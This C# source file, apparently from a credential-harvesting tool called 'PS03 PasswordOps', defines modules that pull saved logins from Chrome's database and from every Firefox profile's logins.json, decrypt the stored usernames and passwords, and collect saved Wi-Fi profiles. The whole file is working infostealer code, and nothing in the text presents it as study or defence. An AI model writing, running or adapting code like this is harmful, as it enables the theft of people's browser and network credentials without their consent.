using Newtonsoft.Json;
using PS03.PasswordOps.FirefoxDecrypt.Models;
using PS03.PasswordOps.WiPS.WiFI;
using PS03.Target.Chrome;
using PS03.Target.Firefox;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using PS03.Target.WiFi.CmdLineExecutor.LocalOps;

namespace PS03
{
    public interface IModule
    {
        List<Profile> Execute(ITarget target);
    }

    public class ChromeModule : IModule
    {
        public List<Profile> Execute(ITarget target)
        {
            var grabber = new DBGrabber();
            var decryptor = new Decryptor();
            var rawProfiles = grabber.GetProfiles();
            var cleanprofiles = new ConcurrentBag<Profile>();
            var returns = new List<Profile>();

            Parallel.ForEach(rawProfiles, (currentfiles) =>
            {
                Profile p = new Profile();
                p.Action = currentfiles.Action;
                p.AppName = target.Name;
                if (!string.IsNullOrWhiteSpace(currentfiles.Specification))
                    p.Specification = currentfiles.Specification;
                else p.Specification = "EMPTY";

                var Password = decryptor.decrypt(currentfiles.encPassword);
                if (!string.IsNullOrWhiteSpace(Password))
                    p.Password = Password;
                else p.Password = "EMPTY";
                cleanprofiles.Add(p);
            });

            /* Er dette hurtigere?
            + På flere tasks der udfører dekrypteringen
            - På oprettelse og nedlæggelse af data.
                 foreach (var profile in data)
            {
                profile.Password = dec.decrypt(profile.encPassword);
            }
            */

            foreach (var profile in cleanprofiles)
            {
                returns.Add(profile);
            }
            return returns;
        }
            private byte[] GetBytes(string str)
            {
                byte[] bytes = new byte[str.Length * sizeof(char)];
                System.Buffer.BlockCopy(str.ToCharArray(), 0, bytes, 0, bytes.Length);
                return bytes;
            }
        }


    

    public class FirefoxModule : IModule
    {
        public List<Profile> Execute(ITarget target)
        {
            var FFops = new FFDecryptOps();
            var CleanProfiels = new List<Profile>();

            var user = Environment.UserName;
            var jsonDirs = Directory.GetDirectories("C:/Users/" + user + "/AppData/Roaming/Mozilla/Firefox/Profiles");

            foreach (var profile in jsonDirs)
            {
                FFops.Init(profile);
                var firefoxPasswords = new List<FFData>();
                var ProfilesList = new ConcurrentBag<Profile>();
                var loginData = new FfLoginDataRoot();
                using (var sr = new StreamReader(profile + "/logins.json"))
                {
                    var json = sr.ReadToEnd();
                    loginData = JsonConvert.DeserializeObject<FfLoginDataRoot>(json);
                }

                Parallel.ForEach(loginData.logins, (data) =>
                {
                    var username = FFops.Decrypt(data.encryptedUsername);
                    if (username == null) username = "EMPTY";
                    var password = FFops.Decrypt(data.encryptedPassword);
                    if (password == null) password = "EMPTY";
                    var host = data.hostname;
                    if (!password.StartsWith("{\"version\":1,\"accountData"))
                        ProfilesList.Add(new Profile { Action = host, Specification = username, Password = password, AppName = target.Name });
                });

                foreach(var p in ProfilesList)
                {
                    CleanProfiels.Add(p);
                }
            }
            return CleanProfiels;
        }
    }

    public class WiFiModule : IModule
    {
        public List<Profile> Execute(ITarget target)
        {
            var getter = new Getter();
            var ProfileList = getter.GetWIfiProfiles();
            return ProfileList;
        }
    }

}
 